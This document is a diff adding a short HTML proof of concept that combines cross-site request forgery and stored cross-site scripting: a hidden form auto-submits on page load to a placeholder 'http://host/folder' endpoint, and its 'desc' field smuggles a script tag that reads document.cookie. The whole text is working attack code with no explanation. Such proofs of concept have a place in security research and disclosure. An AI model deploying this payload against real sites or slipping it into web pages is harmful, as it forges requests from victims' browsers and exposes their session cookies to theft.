@@ -1,0 +1,10 @@
+<form action="http://host/folder" method="post" name="main">
+<input type="hidden" name="object" value="folder">
+<input type="hidden" name="desc" value='title"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="tags" value="">
+<input type="hidden" name="position" value="">
+<input type="hidden" name="readme" value="post txt">
+</form>
+<script>
+document.main.submit();
+</script>
